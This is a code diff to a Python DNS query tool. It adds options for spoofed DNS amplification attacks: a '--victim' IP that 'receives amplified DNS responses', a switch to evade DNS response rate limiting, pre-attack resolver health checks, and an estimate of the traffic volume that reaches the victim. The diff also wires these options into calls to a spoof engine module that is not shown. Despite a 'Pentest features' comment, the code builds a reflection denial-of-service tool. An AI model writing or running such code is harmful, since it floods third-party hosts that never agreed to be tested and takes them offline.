@@ -222,12 +222,19 @@ def display_banner():
     print("  -p or --port             Set the server port")
     print("  -q or --num_queries      Set the number of queries to send (Default: 1)")
     print("  -i or --interval         Set the interval between queries in seconds (Default: 1 second)")
-    print("  -v or --verbose          Enable verbose mode (optional)\n")
+    print("  -v or --verbose          Enable verbose mode (optional)")
+    print("  --spoof                  Enable IP spoofing mode (requires root/admin)")
+    print("  --victim                 Victim IP -- receives amplified DNS responses")
+    print("  --victim_port            Victim source port for spoofed packets (default: 53)")
+    print("  --healthcheck            Test each resolver before firing; remove dead ones")
+    print("  --ratelimit_bypass       Evade DNS RRL: random subdomain prefix + random sport")
+    print("  --estimate               Print estimated inbound traffic volume at victim\n")
 
 if __name__ == "__main__":
+    import sys
     parser = argparse.ArgumentParser(description='DNS query sender')
     parser.add_argument('-d', '--domain', type=str, help='Domain name to query')
-    parser.add_argument('-f', '--file', type=str, help='Path to the file containging DNS resolver addresses')
+    parser.add_argument('-f', '--file', type=str, help='Path to the file containing DNS resolver addresses')
     parser.add_argument('-s', '--server_address', type=str, help='DNS server address')
     parser.add_argument('-p', '--port', type=int, help='DNS server port')
     parser.add_argument('-q', '--num_queries', type=int, default=1, help='Number of queries to send')
@@ -250,16 +257,21 @@ if __name__ == "__main__":
     parser.add_argument('--qclass', type=int, default=1, help='Query class (default IN=1)')
     parser.add_argument('--id', type=int, default=0x1337, help='Transaction ID')
     parser.add_argument('--src_addr', type=str, default=None, help='Bind local source address')
-    parser.add_argument('--af', type=str, default='auto', choices=['auto','4','6'], help='Address family (auto/4/6)')
+    parser.add_argument('--af', type=str, default='auto', choices=['auto', '4', '6'], help='Address family (auto/4/6)')
     parser.add_argument('--hex', action='store_true', help='Print raw hex of responses')
     parser.add_argument('--tcp_nodelay', action='store_true', help='Disable Nagle for TCP')
     parser.add_argument('--tcp_timeout', type=float, default=None, help='TCP timeout override')
     parser.add_argument('--print_query', action='store_true', help='Print query hex when verbose')
     parser.add_argument('--id_random', action='store_true', help='Randomize TXID per query')
-    parser.add_argument('--burst', action='store_true', help='Start threads without delay')
+    parser.add_argument('--burst', action='store_true', help='Start all threads without delay')
+    # Spoofed mode
     parser.add_argument('--spoof', action='store_true', help='Enable IP spoofing mode (requires root)')
     parser.add_argument('--victim', type=str, default=None, help='Victim IP address for spoofed mode')
     parser.add_argument('--victim_port', type=int, default=53, help='Victim source port for spoofed packets (default: 53)')
+    # Pentest features
+    parser.add_argument('--healthcheck', action='store_true', help='Test each resolver before firing; remove dead ones')
+    parser.add_argument('--ratelimit_bypass', action='store_true', help='Evade DNS RRL: random subdomain prefix + random sport per query')
+    parser.add_argument('--estimate', action='store_true', help='Print estimated inbound traffic volume at victim before firing')
 
     args = parser.parse_args()
 
@@ -269,25 +281,63 @@ if __name__ == "__main__":
         if args.file:
             resolvers = get_resolvers_from_file(args.file)
             if args.spoof:
-            if not args.victim:
-                print("[error] --spoof requires --victim <ip>")
-                import sys; sys.exit(1)
-            import spoof_engine
-            spoof_engine.check_root()
-            spoof_engine.send_spoofed_queries_through_resolvers(
-                args.domain, resolvers, args.port, args.victim,
-                args.victim_port, args.num_queries, args.interval,
-                args.qtype, args.edns_payload, args.dnssec_do,
-                args.id, args.id_random, args.verbose, args.measure, args.burst)
-        else:
-            send_queries_through_resolvers(args.domain, resolvers, args.port, args.num_queries, args.interval, args.timeout, args.bufsize, args.verbose, args.qtype, args.edns_payload, args.dnssec_do, args.measure, not args.no_rd, args.src_port, args.tcp_on_trunc, args.retry, args.latency, args.af, args.edns_nsid, args.qclass, args.id, args.src_addr, args.hex, args.burst, args.tcp, args.tcp_bufsize, args.tcp_nodelay, args.tcp_timeout, args.print_query, args.id_random)
-        if args.server_address:
-            if args.tcp:
-                send_dns_query_tcp(args.domain, args.server_address, args.port, args.timeout, args.bufsize, args.verbose, args.qtype, args.edns_payload, args.dnssec_do, args.measure, not args.no_rd, args.af, args.tcp_bufsize, args.edns_nsid, args.qclass, args.id, args.hex, args.tcp_nodelay, args.print_query, args.id_random, args.tcp_timeout)
+                if not args.victim:
+                    print("[error] --spoof requires --victim <ip>")
+                    sys.exit(1)
+                import spoof_engine
+                spoof_engine.check_root()
+                spoof_engine.send_spoofed_queries_through_resolvers(
+                    args.domain, resolvers, args.port, args.victim,
+                    args.victim_port, args.num_queries, args.interval,
+                    args.qtype, args.edns_payload, args.dnssec_do,
+                    args.id, args.id_random, args.verbose, args.measure,
+                    args.burst, args.qclass,
+                    ratelimit_bypass=args.ratelimit_bypass,
+                    healthcheck=args.healthcheck,
+                    healthcheck_timeout=args.timeout,
+                    estimate=args.estimate)
             else:
-                send_dns_query(args.domain, args.server_address, args.port, args.timeout, args.bufsize, args.verbose, args.qtype, args.edns_payload, args.dnssec_do, args.measure, not args.no_rd, args.src_port, args.tcp_on_trunc, args.retry, args.latency, args.af, args.edns_nsid, args.qclass, args.id, args.src_addr, args.hex, args.print_query, args.id_random)
+                send_queries_through_resolvers(
+                    args.domain, resolvers, args.port, args.num_queries,
+                    args.interval, args.timeout, args.bufsize, args.verbose,
+                    args.qtype, args.edns_payload, args.dnssec_do, args.measure,
+                    not args.no_rd, args.src_port, args.tcp_on_trunc, args.retry,
+                    args.latency, args.af, args.edns_nsid, args.qclass, args.id,
+                    args.src_addr, args.hex, args.burst, args.tcp, args.tcp_bufsize,
+                    args.tcp_nodelay, args.tcp_timeout, args.print_query, args.id_random)
+
+        if args.server_address:
+            if args.spoof:
+                if not args.victim:
+                    print("[error] --spoof requires --victim <ip>")
+                    sys.exit(1)
+                import spoof_engine
+                spoof_engine.check_root()
+                spoof_engine.send_spoofed_dns_query(
+                    args.domain, args.server_address, args.port, args.victim,
+                    args.victim_port, args.qtype, args.edns_payload,
+                    args.dnssec_do, args.id, args.id_random, args.verbose,
+                    args.measure, args.qclass,
+                    ratelimit_bypass=args.ratelimit_bypass)
+            elif args.tcp:
+                send_dns_query_tcp(
+                    args.domain, args.server_address, args.port, args.timeout,
+                    args.bufsize, args.verbose, args.qtype, args.edns_payload,
+                    args.dnssec_do, args.measure, not args.no_rd, args.af,
+                    args.tcp_bufsize, args.edns_nsid, args.qclass, args.id,
+                    args.hex, args.tcp_nodelay, args.print_query, args.id_random,
+                    args.tcp_timeout)
+            else:
+                send_dns_query(
+                    args.domain, args.server_address, args.port, args.timeout,
+                    args.bufsize, args.verbose, args.qtype, args.edns_payload,
+                    args.dnssec_do, args.measure, not args.no_rd, args.src_port,
+                    args.tcp_on_trunc, args.retry, args.latency, args.af,
+                    args.edns_nsid, args.qclass, args.id, args.src_addr,
+                    args.hex, args.print_query, args.id_random)
+
         if not args.file and not args.server_address:
-            print("Please provide a file containing DNS resolver addresses using -f/--file or specify the server using -s/--server_address.")
+            print("Please provide -f/--file or -s/--server_address.")
 def send_dns_query_tcp(domain_name, dns_server_address, dns_server_port, timeout, bufsize, verbose, qtype_name='A', edns_payload=0, dnssec_do=False, measure=False, rd=True, af='auto', tcp_bufsize=None, edns_nsid=False, qclass=1, txid=0x1337, raw_hex=False, tcp_nodelay=False, print_query=False, id_random=False, tcp_timeout=None):
     s = socket.socket(_select_af(dns_server_address, af), socket.SOCK_STREAM)
     s.settimeout(tcp_timeout if tcp_timeout is not None else timeout)
